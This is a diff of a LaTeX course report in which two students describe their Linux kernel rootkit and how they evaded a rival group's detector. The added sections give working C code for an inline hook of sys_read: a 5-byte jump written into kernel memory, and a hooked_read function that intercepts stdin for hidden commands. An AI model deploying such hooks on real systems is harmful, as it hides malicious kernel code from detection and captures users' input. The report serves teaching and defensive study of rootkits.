@@ -12,7 +12,7 @@
 
 \newcommand{\todo}[1]{}%{\textcolor{red}{TODO: #1}}
 
-\geometry{margin=3.5cm}
+\geometry{margin=2.5cm}
 
 \title{Rootkit of gruppe 6}
 \author{Roman Karlstetter \and Philipp M\"uller}
@@ -111,9 +111,14 @@ Command & Parameter & Example \\
 \label{tab:rootkit-commands}
 \end{table}
 
-\section{Implementation Details}
-This section first gives an overview on how the module is designed and then describes the technical details of each individual part of the module.
+\section{Implementation Details -- Initial Version}
+
+This section first gives an overview on how the module is designed and then describes the technical details of each individual part of the module. 
+
+Note that this section deals with our initial implementations. After we got the rootkit detector of gruppe 5, we revised some functions.
+
 \subsection{General Design}
+
 We have split up things in "submodules" (each with its own header and implementation file), so
 that our we have some nice modular architecture. This makes our module easily extendable. Everything gets glued together in \texttt{mod.ko}.
 
@@ -154,7 +159,7 @@ The \texttt{hook\_read} submodule reads from stdin and feeds this information in
     \end{tikzpicture}
   
   \caption{The general design of the module. Everything get's glued together in mod.c, where you can easily specify commands which can be used to execute functions of one of the submodules.}
-  \label{fig:hooking-system-call}
+  \label{fig:module-decomposition}
 \end{figure}
 The file names should be self-explanatory, but we should mention some things explicitly.
 
@@ -392,5 +397,158 @@ First, we try to match a magic activating command (this is the three hashes and 
 \end{itemize}
 
 If it does expect an argument (this is always a number), we read again until a whitespace and call the function with the parsed number as argument.
+
+\section{Gruppe 5's Rootkit Detector}
+\label{sec:detectorofgruppe5}
+
+We received a rootkit detector for our rootkit that detects three aspects of our rootkit. This section gives an overview about how detection works.
+
+\begin{description}
+\item[Hooked Read Function] As mentioned in \autoref{fig:hooking-system-call}, we hook \texttt{sys\_read} by changing the function pointer in the system call table. This, however, leaves suspicious traces, since a detector can simply extract the original adress from the \texttt{system.map} file. This is exactly what the detector of gruppe 5 does.
+
+\autoref{sec:hooking-read-2} describes how we evade this detection.
+\end{description}
+
+\section{Detection Evasion}
+\label{sec:detection-evasion}
+
+\subsection{Hooking \texttt{sys\_read} without changing the system call table}
+\label{sec:hooking-read-2}
+
+\subsubsection{Installing the hook}
+\label{sec:hooking-read-install-hook}
+
+This subsection describes how we manipulate the \texttt{read} system call without altering the function pointer in the system call table. While in the original version, we simple redirected the call from the system call table directly to our hooked function (as illustrated in \autoref{fig:hooking-system-call}). Now, we do it another way: We directly modify the code of the original read-system call that resides in memory.
+
+To do so, we inject some custom instructions into the original machine code for the \texttt{read} system call. These injected instructions will cause the machine to jump to \emph{our} hooked function, even if we leave the system call table as it is. This principle is shown in \autoref{fig:read-inlinehook}.
+
+\begin{figure}[ht]
+  \centering
+  \subfigure[Before hooking. Pointer to the original \texttt{sys\_read} system call. You see some machine instructions.]{
+    \begin{tikzpicture}
+      \draw (0,-0.5) rectangle (2,2.5);
+      \node at (1,2.5) [above] {System call table};
+      \draw (0,1) rectangle (2,1.5);
+      \node (p) at (1,1) [above] {\texttt{0xc10ae026}};
+      \node at (5,2.3) [above] {Original \texttt{sys\_read}};
+      \tikzstyle {memorycell} = [shape=rectangle, draw=black, minimum width=4cm, text width=4cm, minimum height=0.65cm];
+      \node (f) [memorycell] at  (5,2) {\texttt{push \%esi}};
+      \node (f1) [memorycell] at (5,1.35) {\texttt{mov \$0xfffffff7,\%esi}};
+      \node (f3) [memorycell] at (5,0.7) {\texttt{[...]}};
+      \node (hf) [memorycell, opacity=0.5] at (5,-.5) {\texttt{hooked\_read}};
+      \draw [->] (2,1.25) .. controls +(.5,0) and +(-.5,0) .. (f.west);
+    \end{tikzpicture}
+  }
+  \subfigure[After hooking. Syscall table stays untouched, but code of \texttt{sys\_read} is modified, so \texttt{sys\_read} itself redirects call to \texttt{hooked\_read}.]{
+    \begin{tikzpicture}
+      \draw (0,-0.5) rectangle (2,2.5);
+      \node at (1,2.5) [above] {System call table};
+      \draw (0,1) rectangle (2,1.5);
+      \node (p) at (1,1) [above] {\texttt{0xc10ae026}};
+      \node at (5,2.3) [above] {Original \texttt{sys\_read}};
+      \tikzstyle {memorycell} = [shape=rectangle, draw=black, minimum width=4cm, text width=4cm, minimum height=0.65cm];
+      \node (f) [memorycell] at  (5,2) {\texttt{jmp \$0xbadc0ded}};
+      \node (f1) [memorycell] at (5,1.35) {\texttt{[...]}};
+      \node (f3) [memorycell] at (5,0.7) {\texttt{[...]}};
+      \node (hf) [memorycell] at (5,-.5) {\texttt{hooked\_read}};
+      \draw [->] (2,1.25) .. controls +(.5,0) and +(-.5,0) .. (f.west);
+      \draw [->, rounded corners, dashed] (f.east) -- +(0.5,0) |- (hf.east);
+    \end{tikzpicture}
+  }
+  \caption{Inline-modification of the read-system call}
+  \label{fig:read-inlinehook}
+\end{figure}
+
+To understand how this works, let us first consider some disassembly of the \texttt{sys\_read} function. We just want to have a look at the first some bytes\footnote{You can produce this output with the following:
+
+\texttt{gdb /usr/src/linux-<version-number>/vmlinux}
+
+\texttt{(gdb) disass sys\_read\ sys\_read+40}} of this function:
+
+\begin{verbatim}
+0xc10ae026:	push   %esi
+0xc10ae027:	mov    $0xfffffff7,%esi
+0xc10ae02c:	push   %ebx
+0xc10ae02d:	sub    $0xc,%esp
+\end{verbatim}
+
+We don't need to examine what these instructions do exactly, but let us consider what we need to do in here to redirect the function call to somewhere else (namely to our \texttt{hooked\_read}).
+
+\begin{verbatim}
+0xc10ae026:	jmp    0xbadc0ded       ;jump to the function of the rootkit
+0xc10ae02b:	[...]                   ;here we still have the original bytes
+\end{verbatim}
+
+It remains to explain how we can alter the machine instructions of \texttt{sys\_read} at runtime. This is done using the following code snippets\footnote{Note that this is not a verbatim excerpt of the code, but just the essential parts for hooking shown together.}:
+
+First of all, we recognize that for the Jump-instruction we want to insert, we need five bytes (one byte for the JMP, and four bytes for the address). So we do
+
+\begin{verbatim}
+#define SYSCALL_CODE_LENGTH 5
+\end{verbatim}
+
+Furthermore, we have to do two things: We have to remember the original bytes that reside in memory, so that we can restore them when unloading the module. Moreover, we create an auxiliary array that holds the 5 bytes needed for our Jump-instruction to be inserted:
+
+\begin{verbatim}
+static char syscall_code[SYSCALL_CODE_LENGTH];
+static char new_syscall_code[SYSCALL_CODE_LENGTH] = "\xe9\x00\x00\x00\x00"; /* jmp $0 */
+\end{verbatim}
+
+
+%$ 
+%bitte drinlassen, sonst haut die autocompletion von auctex net gscheit hin.
+\texttt{syscall\_code} will later hold the \emph{original} bytes from the system call, while \texttt{new\_syscall\_code} holds the bytes representing the jump-instruction to be inserted. 
+
+Note that -- up to now -- we would just jump to 0. This is of course not what we want. We want to jump to \texttt{hooked\_read}. To tell the program so, we do the following:
+
+\begin{verbatim}
+*(int *)&new_syscall_code[1] = 
+ ((int)hooked_read) - ((int)sys_call_table[__NR_read] + 5);
+\end{verbatim}
+
+This sets the last 4 bytes to the corresponding address. Note that we have to compute the difference between \texttt{hooked\_read} and \texttt{sys\_call\_table[\_\_NR\_read]}, since the jump is relative. We have to add 5, because the jump-instruction itself occupies 5 bytes.
+
+So, it remains to backup the original bytes and install the jump-instruction. Therefore, we wrote a small auxiliary function \texttt{\_memcpy} that behaves (or at least should behave) just like the well-known \texttt{memcpy}. It takes one more parameter to handle write-protected memory sections properly.
+
+\begin{verbatim}
+_memcpy( syscall_code, sys_call_table[__NR_read], sizeof(syscall_code), 0);
+_memcpy( sys_call_table[__NR_read], new_syscall_code, sizeof(syscall_code), 1);
+\end{verbatim}
+
+\subsubsection{How the new \texttt{hooked\_read} works}
+\label{sec:hooked-read-2-technique}
+
+Now that we've installed the hook properly, we can think about how the new hooked function works. In principle, it works like the old \texttt{hooked\_read}: It calls the original \texttt{sys\_read}, checks its return values\footnote{It doesn't actually check return value only, but the (potentially modified) arguments.}, does some processing, and returns the value received from the original \texttt{sys\_read}.
+
+The only problem arising here is that the original \texttt{sys\_read} isn't original anymore! We modified it such that it automatically jumps to \texttt{hooked\_read}. Therefore, we have to do some work: 
+
+\begin{itemize}
+\item \texttt{hooked\_read} first restores the original \texttt{sys\_read} function, so it can be called as if it weren't changed anytime.
+\item Then, the original function is called.
+\item Afterwards, the hook is installed back again, i.e. the (now really) original \texttt{sys\_read} is modified such that it jumps to \texttt{hooked\_read}.
+\item At last, the result is returned.
+\end{itemize}
+
+The following code does all this:
+
+\begin{verbatim}
+asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
+    void** sys_call_table = (void *) ptr_sys_call_table;
+    ssize_t retval;
+    OUR_TRY_MODULE_GET;
+    printk(KERN_INFO "This is the hooked read!\n");
+    _memcpy(sys_call_table[SYSCALL_NR], syscall_code, sizeof(syscall_code), 1);
+    retval = ((asmlinkage ssize_t (*)(unsigned int, char __user*, size_t))
+             sys_call_table[SYSCALL_NR])(fd, buf, count);
+    if (retval > 0 && fd == 0){ // we read something from stdin
+        handle_input(buf, retval);
+    }
+    _memcpy(sys_call_table[SYSCALL_NR], new_syscall_code, sizeof(syscall_code), 1);
+    OUR_MODULE_PUT;
+    return retval;
+}
+\end{verbatim}
+
+Note the two occurences of \texttt{\_memcpy} that are responsible for backing up and restoring the original \texttt{read} system call.
 
 \end{document}
